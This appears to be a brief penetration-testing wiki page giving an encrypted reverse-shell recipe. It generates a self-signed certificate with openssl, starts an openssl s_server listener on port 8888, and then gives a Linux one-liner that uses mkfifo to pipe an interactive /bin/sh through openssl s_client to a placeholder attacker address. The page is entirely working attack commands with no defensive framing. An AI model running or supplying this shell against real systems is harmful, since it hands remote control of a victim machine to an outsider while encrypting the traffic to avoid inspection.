<languages  />

Generate self-signed certificate
--------------------------------

    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

The server monitors port 8888
-----------------------------

    openssl s_server -quiet -key key.pem -cert cert.pem -port 8888

Use mkfifo for reverse shell under Linux
----------------------------------------

    mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect Your ip:Your port> /tmp/s; rm /tmp/s

[Category:滲透測試資料](Category:滲透測試資料 "wikilink")